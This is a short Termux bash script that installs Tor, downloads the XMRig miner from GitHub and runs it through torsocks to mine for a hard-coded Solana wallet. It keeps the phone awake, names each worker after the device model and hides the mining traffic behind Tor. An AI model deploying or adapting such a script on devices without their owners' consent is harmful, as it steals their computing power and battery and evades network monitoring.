#!/data/data/com.termux/files/usr/bin/bash

termux-wake-lock
termux-setup-storage

pkg install -y tor obfs4proxy
echo "SOCKSPort 9050" > $PREFIX/etc/tor/torrc
tor &

MINER_URL="https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-android-arm64.tar.gz"
wget $MINER_URL -O miner.tar.gz
tar -xzf miner.tar.gz

torsocks ./xmrig -o rx.unmineable.com:3333 \
    -u SOL:BrRNyvr6TJfhqFewqWenyuC4VrfFAZXJoiPBkLbc8eRk.termux-$(getprop ro.product.model) \
    --keepalive \
    --randomx-no-rdmsr \
    --max-cpu-usage=75 \
    --donate-level=0
